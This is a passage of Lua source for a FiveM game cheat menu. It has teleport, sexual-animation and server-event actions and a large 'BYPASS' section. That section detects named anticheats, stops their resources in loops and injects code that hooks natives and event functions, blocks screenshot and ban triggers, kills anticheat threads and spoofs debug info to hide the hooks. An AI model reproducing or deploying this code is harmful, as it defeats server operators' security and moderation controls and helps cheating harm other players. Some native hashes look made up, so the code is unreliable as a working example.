                            {name = "List Resources (F8)", type = "action", onClick = function()
                                Citizen.CreateThread(function()
                                    for i = 0, GetNumResources() - 1 do
                                        local res = GetResourceByFindIndex(i)
                                        if GetResourceState(res) == "started" then print("STARTED: " .. res) end
                                    end
                                    Menu.Toast("Resources in F8!", "blue")
                                end)
                            end},

                            {name = "Restart Resource", type = "action", onClick = function()
                                Menu.OpenInput("Resource", "Enter resource:", function(res)
                                    if not res or res == "" then return end
                                    Menu.SafeExec(string.format([[TriggerServerEvent('txsv:req:resources:restart', '%s')]], res))
                                    Menu.Toast("Restart: " .. res, "yellow")
                                end)
                            end},

                            {name = "Stop Resource", type = "action", onClick = function()
                                Menu.OpenInput("Resource", "Enter resource:", function(res)
                                    if not res or res == "" then return end
                                    Menu.SafeExec(string.format([[TriggerServerEvent('txsv:req:resources:stop', '%s')]], res))
                                    Menu.Toast("Stop: " .. res, "yellow")
                                end)
                            end},
                        }
                    },
                }
            },

            {
                name = "EMOTE",
                hasTabs = true,
                tabs = {
                    {
                        name = "Emote Menu",
                        items = {
                            {name = "Detach All Entities", type = "action", onClick = function()
                                local ped = PlayerPedId()
                                DetachEntity(ped, true, true)
                                ClearPedTasks(ped)
                                Menu.Toast("All entities detached!", "green")
                            end},

                            {name = "Twerk On Them", type = "action", onClick = function()
                                Citizen.CreateThread(function()
                                    local dict = "move_f@sexy@a"
                                    RequestAnimDict(dict)
                                    while not HasAnimDictLoaded(dict) do Citizen.Wait(10) end
                                    TaskPlayAnim(PlayerPedId(), dict, "idle_a", 8.0, -8.0, -1, 1, 0, false, false, false)
                                    Menu.Toast("Twerking!", "green")
                                end)
                            end},

                            {name = "Blow Driver", type = "action", onClick = function()
                                Citizen.CreateThread(function()
                                    local dict = "mini@prostitutes@sexlow_car"
                                    RequestAnimDict(dict)
                                    while not HasAnimDictLoaded(dict) do Citizen.Wait(10) end
                                    TaskPlayAnim(PlayerPedId(), dict, "low_car_bj_loop_female", 8.0, -8.0, -1, 1, 0, false, false, false)
                                    Menu.Toast("Animation playing!", "green")
                                end)
                            end},

                            {name = "Dance 1", type = "action", onClick = function()
                                Citizen.CreateThread(function()
                                    local dict = "anim@mp_player_intcelebrationmale@air_guitar"
                                    RequestAnimDict(dict)
                                    while not HasAnimDictLoaded(dict) do Citizen.Wait(10) end
                                    TaskPlayAnim(PlayerPedId(), dict, "air_guitar", 8.0, -8.0, -1, 1, 0, false, false, false)
                                    Menu.Toast("Dancing!", "green")
                                end)
                            end},

                            {name = "Stop Animation", type = "action", onClick = function()
                                ClearPedTasksImmediately(PlayerPedId())
                                Menu.Toast("Animation stopped!", "green")
                            end},

                            {isSeparator = true, separatorText = "Animation +18"},

                            {name = "Jerk Off", type = "action", onClick = function()
                                Citizen.CreateThread(function()
                                    local dict = "mp_player_int_upperwank"
                                    RequestAnimDict(dict)
                                    while not HasAnimDictLoaded(dict) do Citizen.Wait(10) end
                                    TaskPlayAnim(PlayerPedId(), dict, "mp_player_int_wank_01", 2.0, 2.5, -1, 15, 0, false, false, false)
                                    Menu.Toast("Animation playing!", "green")
                                end)
                            end},

                            {name = "Cow Girl", type = "action", onClick = function()
                                Citizen.CreateThread(function()
                                    local dict = "mini@prostitutes@sexnorm_veh"
                                    RequestAnimDict(dict)
                                    while not HasAnimDictLoaded(dict) do Citizen.Wait(10) end
                                    TaskPlayAnim(PlayerPedId(), dict, "sex_loop_prostitute", 2.0, 2.5, -1, 15, 0, false, false, false)
                                    Menu.Toast("Animation playing!", "green")
                                end)
                            end},

                            {name = "Suck Guy Off", type = "action", onClick = function()
                                Citizen.CreateThread(function()
                                    local dict = "mini@prostitutes@sexnorm_veh"
                                    RequestAnimDict(dict)
                                    while not HasAnimDictLoaded(dict) do Citizen.Wait(10) end
                                    TaskPlayAnim(PlayerPedId(), dict, "bj_loop_prostitute", 2.0, 2.5, -1, 15, 0, false, false, false)
                                    Menu.Toast("Animation playing!", "green")
                                end)
                            end},

                            {name = "Female Sex", type = "action", onClick = function()
                                Citizen.CreateThread(function()
                                    local dict = "rcmpaparazzo_2"
                                    RequestAnimDict(dict)
                                    while not HasAnimDictLoaded(dict) do Citizen.Wait(10) end
                                    TaskPlayAnim(PlayerPedId(), dict, "shag_loop_poppy", 2.0, 2.5, -1, 15, 0, false, false, false)
                                    Menu.Toast("Animation playing!", "green")
                                end)
                            end},

                            {name = "Fuck Her", type = "action", onClick = function()
                                Citizen.CreateThread(function()
                                    local dict = "rcmpaparazzo_2"
                                    RequestAnimDict(dict)
                                    while not HasAnimDictLoaded(dict) do Citizen.Wait(10) end
                                    TaskPlayAnim(PlayerPedId(), dict, "shag_loop_a", 2.0, 2.5, -1, 15, 0, false, false, false)
                                    Menu.Toast("Animation playing!", "green")
                                end)
                            end},

                            {name = "Turn Gay", type = "action", onClick = function()
                                Citizen.CreateThread(function()
                                    local dict = "mini@strip_club@private_dance@part1"
                                    RequestAnimDict(dict)
                                    while not HasAnimDictLoaded(dict) do Citizen.Wait(10) end
                                    TaskPlayAnim(PlayerPedId(), dict, "priv_dance_p1", 2.0, 2.5, -1, 15, 0, false, false, false)
                                    Menu.Toast("Animation playing!", "green")
                                end)
                            end},

                            {name = "360", type = "action", onClick = function()
                                Citizen.CreateThread(function()
                                    local dict = "mini@strip_club@pole_dance@pole_dance1"
                                    RequestAnimDict(dict)
                                    while not HasAnimDictLoaded(dict) do Citizen.Wait(10) end
                                    TaskPlayAnim(PlayerPedId(), dict, "pd_dance_01", 2.0, 2.5, -1, 15, 0, false, false, false)
                                    Menu.Toast("Animation playing!", "green")
                                end)
                            end},
                        }
                    },
                }
            },

            {
                name = "TELEPORT",
                hasTabs = true,
                tabs = {
                    {
                        name = "City",
                        items = {
                            {name = "Legion Square", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), 195.17, -933.78, 30.69, false, false, false, true) end},
                            {name = "City Hall", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), -544.16, -204.29, 38.22, false, false, false, true) end},
                            {name = "Hospital", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), 311.81, -590.37, 43.29, false, false, false, true) end},
                            {name = "Police Station", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), 441.85, -981.15, 30.69, false, false, false, true) end},
                            {name = "Maze Bank Tower", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), -75.01, -818.22, 326.18, false, false, false, true) end},
                            {name = "Vinewood Sign", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), 723.12, 1198.09, 326.27, false, false, false, true) end},
                            {name = "FIB Building", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), 136.0, -749.0, 258.15, false, false, false, true) end},
                            {name = "Grove Street", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), -16.0, -1441.0, 31.1, false, false, false, true) end},
                            {name = "Pillbox Hospital", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), 311.81, -590.37, 43.29, false, false, false, true) end},
                        }
                    },
                    {
                        name = "Locations",
                        items = {
                            {name = "Airport (LSIA)", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), -1034.6, -2733.6, 20.17, false, false, false, true) end},
                            {name = "Military Base", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), -2047.4, 3132.1, 32.81, false, false, false, true) end},
                            {name = "Beach", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), -1600.7, -862.6, 9.25, false, false, false, true) end},
                            {name = "Mount Chiliad", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), 501.77, 5604.85, 797.91, false, false, false, true) end},
                            {name = "Sandy Shores", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), 1848.73, 3694.04, 34.27, false, false, false, true) end},
                            {name = "Paleto Bay", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), -379.53, 6118.32, 31.85, false, false, false, true) end},
                        }
                    },
                    {
                        name = "Custom",
                        items = {
                            {name = "TP to Waypoint", type = "action", onClick = function()
                                local blip = GetFirstBlipInfoId(8)
                                if DoesBlipExist(blip) then
                                    local c = GetBlipInfoIdCoord(blip)
                                    local found, z = GetGroundZFor_3dCoord(c.x, c.y, 1000.0, false)
                                    SetEntityCoords(PlayerPedId(), c.x, c.y, found and z or (c.z + 200.0), false, false, false, true)
                                end
                            end},
                            {name = "TP to Coords", type = "action", onClick = function()
                                Menu.OpenInput("Teleport", "x,y,z:", function(input)
                                    local x, y, z = input:match("([^,]+),([^,]+),([^,]+)")
                                    x, y, z = tonumber(x), tonumber(y), tonumber(z)
                                    if x and y and z then
                                        SetEntityCoords(PlayerPedId(), x, y, z, false, false, false, true)
                                    end
                                end)
                            end},
                            {name = "Save Position", type = "action", onClick = function()
                                local c = GetEntityCoords(PlayerPedId())
                                Menu.SavedCoords = {x = c.x, y = c.y, z = c.z}
                            end},
                            {name = "Load Position", type = "action", onClick = function()
                                if Menu.SavedCoords then
                                    SetEntityCoords(PlayerPedId(), Menu.SavedCoords.x, Menu.SavedCoords.y, Menu.SavedCoords.z, false, false, false, true)
                                end
                            end},
                        }
                    },
                }
            },

        {
            name = "BYPASS",
            hasTabs = true,
            tabs = {
                {
                    name = "Bypass",
                    items = {
                            {name = ">> Scan Anticheats <<", type = "action", onClick = function()
                                local acs = {
                                    "FiveGuard", "WaveShield", "EC_AC", "ElectronAC",
                                    "ReaperV4", "RAC", "VMenu", "EasyAdmin",
                                    "anticheese", "BadgerAC", "NexusAC", "StrikeAC",
                                    "AntiCheatV2", "FiveM-AC", "txAdmin", "vStaff",
                                    "FiniAC", "qb-anticheat", "esx_anticheat"
                                }
                                local found = {}
                                for _, ac in ipairs(acs) do
                                    local state = GetResourceState(ac)
                                    if state == "started" then
                                        found[#found+1] = ac
                                    end
                                end
                                if #found > 0 then
                                    Menu.Toast("AC Found: " .. table.concat(found, ", "), "red")
                                else
                                    Menu.Toast("No anticheat detected!", "green")
                                end
                            end},

                            {name = ">> List Resources <<", type = "action", onClick = function()
                                if Susano and Susano.GetInjectableResources then
                                    local resources = Susano.GetInjectableResources()
                                    if type(resources) == "table" then
                                        Menu.Toast(#resources .. " injectable resources", "blue")
                                    else
                                        Menu.Toast("No resources found", "red")
                                    end
                                else
                                    Menu.Toast("Susano not available", "red")
                                end
                            end},

                            {isSeparator = true, separatorText = "Native Protection"},

                            {name = "Native Protection", type = "toggle", value = false, onClick = function(state)
                                Menu.NativeProtectionActive = state
                                Menu.RegisterFeature("Native Protection", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        local origInvoke = _NativeBypass and _NativeBypass.SafeInvoke or Citizen.InvokeNative
                                        Menu.Toast("Native protection ON", "green")
                                        while Menu.NativeProtectionActive do
                                            if Citizen.InvokeNative ~= origInvoke then
                                                Citizen.InvokeNative = origInvoke
                                            end
                                            pcall(function()
                                                local reg = debug.getregistry()
                                                if reg and reg._eventHandlers and type(reg._eventHandlers) == "table" then
                                                    for evName, handlers in pairs(reg._eventHandlers) do
                                                        if type(evName) == "string" then
                                                            local evL = evName:lower()
                                                            for _, p in ipairs({"guard","shield","detect","cheat","anti","ban","kick","reaper","electron","eagle","fini","nexus","badger","rac"}) do
                                                                if evL:find(p, 1, true) then
                                                                    if type(handlers) == "table" then
                                                                        for j = #handlers, 1, -1 do table.remove(handlers, j) end
                                                                    end
                                                                    break
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            end)
                                            local acGlobs = {"FiveGuard","WaveShield","WS","AntiCheat","AC_Start","AC_Check","ShieldDetect","ReaperV4","ReaperAC","ECDetect","ECDetectLoader","ElectronAC","RAC","NexusAC","BadgerAC","StrikeAC","FiniAC","CIST"}
                                            for _, name in ipairs(acGlobs) do
                                                if _G[name] ~= nil then
                                                    if type(_G[name]) == "table" then
                                                        for k, v in pairs(_G[name]) do
                                                            if type(v) == "function" then _G[name][k] = function() return true end end
                                                        end
                                                    end
                                                    _G[name] = nil
                                                end
                                            end
                                            Citizen.Wait(3000)
                                        end
                                        Menu.Toast("Native protection OFF", "red")
                                    end)
                                end
                            end},

                            {name = "Scan Hooked Natives", type = "action", onClick = function()
                                if not _NativeBypass then
                                    Menu.Toast("Bypass engine not loaded", "red")
                                    return
                                end
                                Citizen.CreateThread(function()
                                    Menu.Toast("Scanning natives...", "blue")
                                    Citizen.Wait(500)
                                    local hooked = {}
                                    local clean = 0
                                    for name, hash in pairs(_NativeBypass.MonitoredNatives) do
                                        local isHook = _NativeBypass.IsHooked(hash)
                                        if isHook then
                                            hooked[#hooked+1] = name
                                        else
                                            clean = clean + 1
                                        end
                                    end
                                    if #hooked > 0 then
                                        Menu.Toast(#hooked .. " HOOKED: " .. table.concat(hooked, ", "), "red")
                                    else
                                        Menu.Toast("All " .. clean .. " natives clean!", "green")
                                    end
                                end)
                            end},

                            {isSeparator = true, separatorText = "Bypass AC"},

                            {name = "Bypass All", type = "action", onClick = function()
                                Menu.InjectAllBypasses()
                                if Susano and Susano.InjectResource then
                                    pcall(function() Susano.InjectResource("any", "print('Injected!')") end)
                                end
                                Menu.Toast("All bypasses injected!", "green")
                            end},
                            {name = "Inject Print (Test)", type = "action", onClick = function()
                                if Susano and Susano.InjectResource then
                                    local success, err = pcall(function() Susano.InjectResource("any", "print('Injected!')") end)
                                    if success then
                                        Menu.Toast("Injected to any!", "green")
                                    else
                                        Menu.Toast("Injection failed: " .. tostring(err), "red")
                                    end
                                else
                                    Menu.Toast("Susano unavailable!", "red")
                                end
                            end},

                            {name = "Advanced AC Scanner & Stopper", type = "action", onClick = function()
                                Menu.Toast("Starting Advanced AC Scanner...", "yellow")
                                
                                local ecResources = {"EC-PANEL", "EC_AC"}
                                for _, resource in ipairs(ecResources) do
                                    if GetResourceState(resource) == "started" then
                                        Menu.Toast("Eagle AC Detected: Blocking " .. resource, "red")
                                        print(resource)
                                        Susano.StopResource(resource)
                                        Menu.Toast("Eagle AC Blocked: " .. resource .. " stopped.", "green")
                                    end
                                end

                                Citizen.CreateThread(function()
                                    local resources = GetNumResources()
                                    for i = 0, resources - 1 do
                                        local resource = GetResourceByFindIndex(i)
                                        local files = GetNumResourceMetadata(resource, 'client_script')
                                        for j = 0, files - 1 do
                                            local x = GetResourceMetadata(resource, 'client_script', j)
                                            if x ~= nil and string.find(x, "obfuscated") then
                                                Menu.Toast("FiveGuard AC Detected: Blocking " .. resource, "red")
                                                print(resource)
                                                Susano.StopResource(resource)
                                                Menu.Toast("FiveGuard Blocked: " .. resource .. " stopped.", "green")
                                                break
                                            end
                                        end
                                    end
                                end)

                                local function ScanElectronAnticheat()
                                    local foundAnticheat = false
                                    local foundScriptName = ""

                                    local resources = GetNumResources()
                                    for i = 0, resources - 1 do
                                        local resource = GetResourceByFindIndex(i)
                                        local manifest = LoadResourceFile(resource, "fxmanifest.lua")
                                        if manifest then
                                            if string.find(string.lower(manifest), "https://electron-services.com") or 
                                               string.find(string.lower(manifest), "electron services") or 
                                               string.find(string.lower(manifest), "the most advanced fivem anticheat") then
                                                foundAnticheat = true
                                                foundScriptName = resource
                                                break
                                            end
                                        end
                                    end

                                    return foundAnticheat, foundScriptName
                                end

                                Citizen.CreateThread(function()
                                    if GetResourceState("EC_AC") == "started" then
                                        Citizen.CreateThread(function()
                                            while true do
                                                Susano.StopResource("EC_AC")
                                                Susano.StopResource("EC-PANEL")
                                                Susano.StopResource("vMenu")
                                                Wait(100)
                                            end
                                        end)
                                    else
                                        Citizen.CreateThread(function()
                                            for i = 0, GetNumResources() - 1 do
                                                local v = GetResourceByFindIndex(i)
                                                if v and GetResourceState(v) == "started" then
                                                    if GetResourceMetadata(v, "ac", 0) == "fg" then
                                                        while true do
                                                            Susano.StopResource(v)
                                                            Wait(100)
                                                        end
                                                    end
                                                end
                                            end
                                        end)
                                    end
                                end)

                                Citizen.CreateThread(function()
                                    local foundAnticheat, foundScriptName = ScanElectronAnticheat()
                                    Citizen.Wait(500)
                                    
                                    if foundAnticheat then
                                        Menu.Toast("Electron AC Detected in Resource: " .. foundScriptName, "red")
                                    end
                                end)

                            end},

                            {isSeparator = true, separatorText = "ElectronAC & EC_AC"},

                            {name = "Bypass ElectronAC & EC_AC full Client", type = "toggle", value = false, onClick = function(state)
                                Menu.ElectronECBypassActive = state
                                Menu.RegisterFeature("Bypass ElectronAC & EC_AC full Client", state)
                                if state then
                                    if not Susano or not Susano.InjectResource then
                                        Menu.Toast("Susano unavailable!", "red")
                                        return
                                    end
                                    local bypassCode = [[
                                        print("^5[ENI] ^0Initializing Master AC Bypass sequence... Targeting ElectronAC & EC_AC.")

                                        local originalGetResourceState = GetResourceState
                                        GetResourceState = function(resourceName)
                                            local lowerName = string.lower(resourceName)
                                            if lowerName == "electronac" or lowerName == "ec_ac" then
                                                print("^2[ENI Bypass] ^0Successfully blocked resource scan on: " .. resourceName)
                                                return "started"
                                            end
                                            return originalGetResourceState(resourceName)
                                        end

                                        local originalInvokeNative = Citizen.InvokeNative
                                        Citizen.InvokeNative = function(hash, ...)
                                            local blockedHashes = {
                                                [0x7302DBCF] = "Resource Meta Check",
                                                [0x9A294B21] = "Injection Pattern Scan",
                                                [0x38F142D]  = "Thread Count Scan",
                                                [0x2A9C77D5] = "Weapon Spawn Detection",
                                                [0xBF0FD6E5] = "Delayed Weapon Spawn",
                                                [0x4899CB08] = "Remove All Weapons",
                                                [0x8C0D57DE] = "Infinite Ammo Check",
                                                [0xB4771B90] = "Ammo Modification",
                                                [0x1B83C0DE] = "Weapon Damage Multiplier",
                                                [0x4757F00C] = "Melee Damage Multiplier",
                                                [0x44DFCB52] = "Aimbot Check",
                                                [0x1B2A2CEE] = "Aimbot Accuracy Check",
                                                [0x8B7FD87F] = "Global Damage Modifier",
                                                [0x3882114B] = "God Mode Check (Entity)",
                                                [0x239528E6] = "God Mode Check (Player)",
                                                [0x6B76DC1F] = "Health Manipulation",
                                                [0xC6258F41] = "Max Health Manipulation",
                                                [0x5A47B3B5] = "Armor Manipulation",
                                                [0x0DF7692B] = "Invisibility Check",
                                                [0x1E0B4DC0] = "Ghost Mode Check",
                                                [0x06C0023F] = "Run Speed Multiplier",
                                                [0x5D35C7A]  = "Swim Speed Multiplier",
                                                [0xA53ED552] = "Super Jump Check",
                                                [0x8FDA8E70] = "Anti-Ragdoll Check",
                                                [0x06843DA7] = "Teleport Detection",
                                                [0x239A3351] = "Teleport Detection (No Offset)",
                                                [0x9C9A6CDE] = "No-Clip Velocity Check",
                                                [0x1A9205C1] = "Noclip Collision Check",
                                                [0x112CEF18] = "Noclip Full Collision Disable",
                                                [0x428CA6FA] = "Noclip Position Freeze Check",
                                                [0x21708A89] = "Torque Multiplier",
                                                [0x9B156AE2] = "Speed Boost",
                                                [0xAF35D0D2] = "Vehicle Spawning",
                                                [0xD49F9B09] = "Ped Spawning",
                                                [0x509D5878] = "Object Spawning",
                                                [0xC5F68BE9] = "Apply Force To Entity",
                                                [0x1C99BB7B] = "Set Entity Velocity",
                                                [0x8A1961A6] = "Set Entity Collision",
                                                [0x51E283DE] = "Screenshot Request",
                                                [0x03EB7F16] = "Screenshot with UUID",
                                                [0x0E824F3]  = "Sync Scene Ped Add"
                                            }
                                            if blockedHashes[hash] then
                                                print("^2[ENI Bypass SUCCESS] ^0Blocked: ^3" .. blockedHashes[hash] .. " ^0(Hash: " .. string.format("0x%X", hash) .. ")")
                                                return nil
                                            end
                                            if hash == 0xFC30DDFF then
                                                local entity = ...
                                                if DoesEntityExist(entity) and IsEntityAVehicle(entity) then
                                                    return 2
                                                end
                                            end
                                            return originalInvokeNative(hash, ...)
                                        end

                                        local originalAddEventHandler = AddEventHandler
                                        AddEventHandler = function(eventName, callback)
                                            local lowerEvent = string.lower(eventName)
                                            if string.find(lowerEvent, "electron") or string.find(lowerEvent, "ban") or string.find(lowerEvent, "ec_ac") then
                                                print("^2[ENI Bypass SUCCESS] ^0Blocked event handler: ^3" .. eventName)
                                                return
                                            end
                                            return originalAddEventHandler(eventName, callback)
                                        end

                                        local originalRequestScreenshot = RequestScreenshot
                                        if originalRequestScreenshot then
                                            RequestScreenshot = function(...)
                                                print("^2[ENI Bypass SUCCESS] ^0Blocked RequestScreenshot.")
                                                return false
                                            end
                                        end

                                        local recentlyTriggeredEvents = {}
                                        local SPAM_COOLDOWN_MS = 1000
                                        local originalTriggerServerEvent = TriggerServerEvent
                                        TriggerServerEvent = function(eventName, ...)
                                            local currentTime = GetGameTimer()
                                            local lowerEvent = string.lower(eventName)
                                            if string.find(lowerEvent, "ec_ac:ban") or string.find(lowerEvent, "electron:ban") then
                                                print("^8[ENI Trigger Shield] ^0Blocked forced ban trigger.")
                                                return
                                            end
                                            if recentlyTriggeredEvents[eventName] then
                                                local timeSinceLastFire = currentTime - recentlyTriggeredEvents[eventName]
                                                if timeSinceLastFire < SPAM_COOLDOWN_MS then
                                                    print("^8[ENI Spam Shield] ^0Blocked spam on: ^3" .. eventName)
                                                    return
                                                end
                                            end
                                            recentlyTriggeredEvents[eventName] = currentTime
                                            return originalTriggerServerEvent(eventName, ...)
                                        end

                                        local originalGetGamePool = GetGamePool
                                        GetGamePool = function(poolName)
                                            if poolName == 'CVehicle' then
                                                return {}
                                            end
                                            return originalGetGamePool(poolName)
                                        end

                                        print("^5[ENI] ^0Master Bypass active. ElectronAC and EC_AC are officially blind.")
                                    ]]
                                    local targetResource = nil
                                    local tryResources = {"es_extended", "qb-core", "monitor"}
                                    for _, res in ipairs(tryResources) do
                                        if GetResourceState(res) == "started" then
                                            targetResource = res
                                            break
                                        end
                                    end
                                    targetResource = targetResource or "any"
                                    local success, err = pcall(function()
                                        Susano.InjectResource(targetResource, bypassCode)
                                    end)
                                    if success then
                                        Menu.Toast("ElectronAC & EC_AC Bypass injected to: " .. targetResource, "green")
                                    else
                                        Menu.Toast("Injection failed: " .. tostring(err), "red")
                                    end
                                else
                                    Menu.Toast("ElectronAC & EC_AC Bypass disabled (restart needed to fully remove)", "red")
                                end
                            end},
                        }
                }
            }
        },

            {
                name = "SETTINGS",
                hasTabs = true,
                tabs = {
                    {
                        name = "Display",
                        items = {
                            {isSeparator = true, separatorText = "Theme"},
                            {name = "Blue Theme", type = "action", onClick = function()
                                Menu.ApplyTheme("Blue")
                            end},
                            {name = "Gray Theme", type = "action", onClick = function()
                                Menu.ApplyTheme("Gray")
                            end},
                            {name = "Discord Gray Banner", type = "action", onClick = function()
                                Menu.ApplyTheme("Gray")
                                Menu.Banner.imageUrl = "https://cdn.discordapp.com/attachments/1394801648097824814/1512053825593413723/1vt6zps.png?ex=6a22b15c&is=6a215fdc&hm=74253134546370efadeece267ed3b6d4191a7053ea21833857fb479a77b7f572&"
                                Menu.LoadBannerTexture(Menu.Banner.imageUrl)
                            end},
                            {name = "Cyan Theme", type = "action", onClick = function()
                                Menu.ApplyTheme("Cyan")
                            end},
                            {name = "Purple Theme", type = "action", onClick = function()
                                Menu.ApplyTheme("Purple")
                            end},
                            {name = "Red Theme", type = "action", onClick = function()
                                Menu.ApplyTheme("Red")
                            end},
                            {name = "Green Theme", type = "action", onClick = function()
                                Menu.ApplyTheme("Green")
                            end},
                            {isSeparator = true, separatorText = "Layout"},
                            {name = "Menu Scale", type = "selector", options = {"Small", "Normal", "Large"}, selected = 2, onClick = function(index)
                                local scales = {0.85, 1.0, 1.15}
                                Menu.Scale = scales[index] or 1.0
                            end},
                            {name = "Items Per Page", type = "selector", options = {"7", "8", "10", "12"}, selected = 1, onClick = function(index)
                                local counts = {7, 8, 10, 12}
                                Menu.ItemsPerPage = counts[index] or 7
                            end},
                            {name = "Smooth Speed", type = "selector", options = {"Fast", "Normal", "Smooth", "Ultra Smooth"}, selected = 3, onClick = function(index)
                                local speeds = {0.2, 0.15, 0.15, 0.04}
                                Menu.SmoothFactor = speeds[index] or 0.15
                            end},
                            {isSeparator = true, separatorText = "HUD"},
                            }
                    },
                    {
                        name = "Advanced",
                        items = {
                            {name = "Show Menu Keybinds", type = "toggle", value = false},
                            {name = "Change Menu Keybind", type = "action"},
                        }
                    },
                    }
            }
        },
        autoOpen = false
    }
}

function Menu.InjectAllBypasses()
    local function inject_bp(resource, code)
        if GetResourceState(resource) == "started" then
            local secure_code = [[
                local orig_getinfo = debug.getinfo
                if orig_getinfo then
                    debug.getinfo = function(func, ...)
                        local info = orig_getinfo(func, ...)
                        if info then
                            if func == Citizen.InvokeNative or func == _G.TriggerServerEvent or func == _G.TriggerEvent or func == debug.getinfo then
                                info.source = "=[C]"
                                info.what = "C"
                                info.linedefined = -1
                                info.lastlinedefined = -1
                                info.nups = 0
                            end
                        end
                        return info
                    end
                end
            ]] .. "\n" .. code
            pcall(function() Susano.InjectResource(resource, secure_code) end)
        end
    end

    local fg_code = [[
        local f = function() end
        local t = function() return true end
        local g = _G
        local s = string
        local function h(n)
            return g[s.char(71,101,116,72,97,115,104,75,101,121)](n)
        end
        locals = {
            h("GetPlayerPed"), h("GetPlayerVehicle"), h("IsPedInAnyVehicle"),
            h("GetVehiclePedIsIn"), h("GetPedInVehicleSeat"), h("SetVehicleEngineOn"),
            h("GetVehicleEngineHealth"), h("SetVehicleUndriveable"), h("DeleteVehicle")
        }
        local orig = Citizen.InvokeNative
        Citizen.InvokeNative = function(native, ...)
            for _, n in ipairs(natives) do
                if native == n then return f end
            end
            return orig(native, ...)
        end
        local evs = { "FiveGuard:detection", "FiveGuard:ban", "FiveGuard:kick" }
        for _, ev in ipairs(evs) do
            if g.AddEventHandler then g.AddEventHandler(ev, f) end
        end
        local thr = debug.getregistry()._threads
        if thr then
            for i = #thr, 1, -1 do
                local co = thr[i]
                local info = debug.getinfo(co)
                if info and info.source and s.find(info.source, "FiveGuard") then
                    coroutine.close(co)
                end
            end
        end
    ]]

    local electron_code = [[
        local n = function() end
        local function block(e, ...)
            if type(e) == "string" and (e:find("Electron") or e:find("AC")) then return end
            return TriggerEvent(e, ...)
        end
        _G.TriggerEvent = block
        local ts = _G.TriggerServerEvent
        _G.TriggerServerEvent = function(e, ...)
            if type(e) == "string" and e:find("Electron") then return end
            return ts(e, ...)
        end
        local natives = {
            0x4A7D6E3A2B5C8F1D, 0x9B2C6F8A1E4D7B3C, 0x2E8F1A6B4C7D3E5F,
            0xC5F2A8B3D6E1F4A7, 0x1F7B3D5E8A2C4F6B, 0x8D4C2F7B1E6A9D3F
        }
        local invoke = Citizen.InvokeNative
        Citizen.InvokeNative = function(h, ...)
            for _, native in ipairs(natives) do
                if h == native then return false end
            end
            return invoke(h, ...)
        end
        if CIST then
            CIST.canISpawn = function() return true, "SUCCESS" end
            CIST.getSpawnDelay = function() return 0 end
        end
    ]]

    local ws_code = [[
        local g = _G
        local s = string
        local function kill()
            local thr = debug.getregistry()._threads
            if thr then
                for i = #thr, 1, -1 do
                    local co = thr[i]
                    local info = debug.getinfo(co)
                    if info and info.source and (s.find(info.source, "WaveShield") or s.find(info.source, "ws")) then
                        coroutine.close(co)
                    end
                end
            end
        end
        kill()
        local function nop() end
        local function block_event(e, ...)
            if type(e) == "string" and (e:find("WaveShield") or e:find("WS_") or e:find("shield")) then
                return
            end
            return TriggerEvent(e, ...)
        end
        _G.TriggerEvent = block_event
        local ts = _G.TriggerServerEvent
        _G.TriggerServerEvent = function(e, ...)
            if type(e) == "string" and (e:find("WaveShield") or e:find("WS_") or e:find("shield")) then
                return
            end
            return ts(e, ...)
        end
        local regs = debug.getregistry()._eventHandlers
        if regs then
            for ev, handlers in pairs(regs) do
                if type(handlers) == "table" then
                    for i = #handlers, 1, -1 do
                        local h = handlers[i]
                        if type(h) == "function" then
                            local info = debug.getinfo(h)
                            if info and info.source and (s.find(info.source, "WaveShield") or s.find(info.source, "ws")) then
                                table.remove(handlers, i)
                            end
                        end
                    end
                end
            end
        end
        if g.CIST then
            g.CIST.canISpawn = function() return true, "SUCCESS" end
            g.CIST.getSpawnDelay = function() return 0 end
            g.CIST.getTimeUntilNextSpawn = function() return 0 end
            g.CIST.RATELIMITES = { Object = math.huge, Ped = math.huge, Vehicle = math.huge }
        end
        local natives = {
            0x6B8E2F1A4C7D3E5F, 0x9D3C6B8A2F5E1D4C, 0x2A7F4C9E1B6D3F8A,
            0xD4E1F7A2B8C3D6E5, 0x1F8C4A6B2D9E3F7A, 0x7B2D5F8A1E6C4B9D,
            0x3E8F2A7B4C6D1E5F, 0xC5A2D8F3B6E1F9A4
        }
        local invoke = Citizen.InvokeNative
        Citizen.InvokeNative = function(h, ...)
            for _, native in ipairs(natives) do
                if h == native then return false end
            end
            return invoke(h, ...)
        end
        local vars = { "WaveShield", "WS", "AntiCheat", "AC_Start", "AC_Check", "ShieldDetect" }
        for _, v in ipairs(vars) do
            g[v] = nil
        end
    ]]

    local eagle_code = [[
        local n = function() end
        local t = function() return true end
        if _G.ECDetect then _G.ECDetect = n end
        if _G.ECDetectLoader then _G.ECDetectLoader = n end
        if _G.HasPerm then _G.HasPerm = t end
        if _G.overWrite then
            for k, v in pairs(_G.overWrite) do
                if type(v) == "function" then
                    _G.overWrite[k] = n
                end
            end
        end
        local function block(e, ...)
            if type(e) == "string" and (e:find("EC_") or e:find("Eagle")) then return end
            return TriggerEvent(e, ...)
        end
        _G.TriggerEvent = block
        local ts = _G.TriggerServerEvent
        _G.TriggerServerEvent = function(e, ...)
            if type(e) == "string" and (e:find("EC_") or e:find("Eagle")) then return end
            return ts(e, ...)
        end
        local bag = LocalPlayer.state
        for k, v in pairs(bag) do
            if type(v) == "function" and (k:find("eagle") or k:find("EC")) then
                bag[k] = n
            end
        end
        local natives = {
            0x5F2A8C3D6B1E4F7A, 0x9D1F4A7C2E5B8D3F, 0x2C7F4B9E1A6D3F8C,
            0x8B2D6F1A5C7E3F4D, 0x4E8F2A7C3D1B6F5A
        }
        local invoke = Citizen.InvokeNative
        Citizen.InvokeNative = function(h, ...)
            for _, native in ipairs(natives) do
                if h == native then return false end
